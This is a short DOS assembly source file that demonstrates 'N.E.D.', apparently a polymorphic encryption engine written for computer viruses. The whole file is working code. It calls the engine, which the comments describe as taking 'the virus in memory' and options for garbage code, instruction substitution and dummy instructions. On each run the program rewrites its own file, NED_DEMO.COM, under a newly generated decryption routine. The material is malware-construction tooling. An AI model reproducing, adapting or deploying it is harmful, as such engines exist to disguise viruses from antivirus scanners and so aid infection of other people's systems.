

.model tiny
.code
		org	0100h

extrn		ned_end:abs
extrn		nuke_enc_dev:near

; This bit here (main) is just a demonstration shell to show off N.E.D's
; capabilities.  Every time this file is executed, it will be encrypted
; with a totally different encryption scheme.

main		proc	near
		call	there
there:		pop	bp
		sub	bp,offset there

		mov	ah,09h
		lea	dx,[bp + start_message]
		int	021h

; Arguments:    AX = offset of buffer to hold data
;		BX = offset of code start
;		CX = offset of the virus in memory (next time around!)
;		DX = length of code to copy and encrypt
;		SI = options:
;			bit 0:	dummy instructions
;			bit 1:	MOV variance
;			bit 2:  ADD/SUB substitution
;			bit 3:  garbage code
;			bit 4:  don't assume DS = CS
;			bits 5-15:  reserved
;
; Returns:	AX = size of generated decryption routine and encrypted code

		lea	ax,[bp + ned_end]
		lea	bx,[bp + main]
		mov	cx,0100h
		mov	dx,end_of_code - main
		mov	si,0000000000001111b
		call	nuke_enc_dev
		push	ax

		mov	ax,03D02h
		lea	dx,[bp + filename]
		int	021h
		xchg	bx,ax

		pop	cx
		mov	ah,040h
		lea	dx,[bp + ned_end]
		int	021h

		mov	ah,040h
		xor	cx,cx
		int	021h

		mov	ah,03Eh
		int	021h

		mov	ah,09h
		lea	dx,[bp + end_message]
		int	021h

		mov	ax,04C00h
		int	021h

filename	db	"NED_DEMO.COM",0
start_message	db	"Beginning mutation...","$"
end_message	db	"mutation successful!",13,10,"$"
main		endp

end_of_code	label	near

		end	main
